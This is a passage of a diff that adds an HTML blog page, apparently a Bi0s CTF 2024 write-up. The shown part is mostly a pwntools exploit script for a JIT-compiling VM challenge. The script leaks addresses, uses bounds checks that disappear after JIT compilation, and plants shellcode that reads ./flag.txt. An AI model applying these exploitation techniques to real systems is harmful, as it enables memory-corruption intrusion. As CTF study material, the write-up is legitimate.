+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> optimize(jit_leakf, additional_code_perloop1<span style="color:#f92672">=</span> compiler<span style="color:#f92672">.</span>push(r1) <span style="color:#f92672">+</span> compiler<span style="color:#f92672">.</span>ret()) <span style="color:#75715e"># popf is already optimized</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># main += optimize(popf, additional_code_perloop = compiler.push(r1)) # already optimized</span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>call(jit_leakf) 
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>mov(r1, <span style="color:#ae81ff">0xf</span>)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>sub(r0, r0, r1)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>set(r0, <span style="color:#ae81ff">0xf08</span>) <span style="color:#75715e"># bss+0xf08 = JIT page</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 2) Leak binary base</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># call pop ret -&gt; push ret -&gt; flow recover</span>
+</span></span><span style="display:flex;"><span>    push_ret <span style="color:#f92672">=</span> compiler<span style="color:#f92672">.</span>nop() <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>    push_ret <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>push(r0)
+</span></span><span style="display:flex;"><span>    push_ret <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>ret()
+</span></span><span style="display:flex;"><span>    kowaii<span style="color:#f92672">.</span>add_func(push_ret)
+</span></span><span style="display:flex;"><span>    pushf <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> optimize(pushf, additional_code_perloop <span style="color:#f92672">=</span> compiler<span style="color:#f92672">.</span>mov(r2,<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> compiler<span style="color:#f92672">.</span>add(r0,r1,r2))
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>mov(r1, <span style="color:#ae81ff">0x10</span>) 
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>get(r0, <span style="color:#ae81ff">0xf08</span>) <span style="color:#75715e"># get JIT</span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>add(r0, r1, r0) 
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>push(r0) <span style="color:#75715e"># r0 = (push r10; ret)</span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>call(popf) <span style="color:#75715e"># return to (push r10; ret) which will recover the context</span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>mov(r1, <span style="color:#ae81ff">0x4193</span>)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>sub(r0, r0, r1) <span style="color:#75715e"># get binbase</span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>set(r0, <span style="color:#ae81ff">0xf10</span>) <span style="color:#75715e"># bss+0xf10 = binbase</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 3) write shellcode in JIT </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 0x0000000000004b0e : add byte ptr [rax + 0x29], cl ; ret</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># once call opcode is jit compiled and executed, rax always points to the JIT address.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># and cl register can be controlled using shl opcode </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># 3) vmpc = bss and modifying imm32 of mov </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># once SET/GET instruction is jit compiled, bounds check is eliminated</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># if(addr &gt; this-&gt;bin-&gt;bss || addr &lt; CODE_START_ADDR) error(&#34;Invalid function table!&#34;);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># function entry can point to the starting point of bss</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_shellcode</span>(c):
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">=</span> asm(c)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> len(code) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> compiler<span style="color:#f92672">.</span>mov(<span style="color:#ae81ff">0</span>, u32(code<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xeb\x02</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># context.arch = &#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode = b&#39;&#39; </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;xor eax, eax&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;inc eax&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;inc eax&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;push r11&#39;) # path</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;pop rdi&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;push 0&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;pop rsi&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;push 0&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;pop rdx&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;syscall&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;push rax&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;pop rdi&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;push rsp&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;pop rsi&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;push 0x7f&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;pop rdx&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;xor eax, eax&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;syscall&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;xor eax, eax&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;inc eax&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;push rsp&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;pop rsi&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;push 1&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;pop rdi&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;push 0x7f&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;pop rdx&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += gen_shellcode(&#39;syscall&#39;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode += compiler.ret()</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print(list(shellcode))</span>
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> bytes([<span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">187</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    kowaii<span style="color:#f92672">.</span>add_func(shellcode)
+</span></span><span style="display:flex;"><span>    shellcodef <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>    kowaii<span style="color:#f92672">.</span>set_bss_data(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;./flag.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> optimize(shellcodef)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>get(r0, <span style="color:#ae81ff">0xf08</span>) <span style="color:#75715e"># get JIT</span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>mov(r1, <span style="color:#ae81ff">0x15</span>)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>add(r0, r0, r1)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>push(r0)<span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>push(r0)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>get(r0, <span style="color:#ae81ff">0xf00</span>) <span style="color:#75715e"># get bss</span>
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>mov(r1,<span style="color:#ae81ff">0xad45</span>)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>add(r1,r0,r1)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>shl(r5,<span style="color:#ae81ff">0xf</span>)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>call(popf)
+</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">+=</span> compiler<span style="color:#f92672">.</span>hlt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode start jit + 0x15</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    kowaii<span style="color:#f92672">.</span>set_main(main)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    binary <span style="color:#f92672">=</span> kowaii<span style="color:#f92672">.</span>get_binary()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./out.bin&#39;</span>,env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_mainLOAD&#34;</span>:<span style="color:#e6db74">&#34;./libm.so.6 ./libseccomp.so.2&#34;</span>})
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;binary&#39;</span>,binary<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pause()
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;mode?&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://msh1307.kr/tags/bi0s-ctf-2024/">Bi0s CTF 2024</a></li>
+      <li><a href="https://msh1307.kr/tags/jit-exploit/">JIT Exploit</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
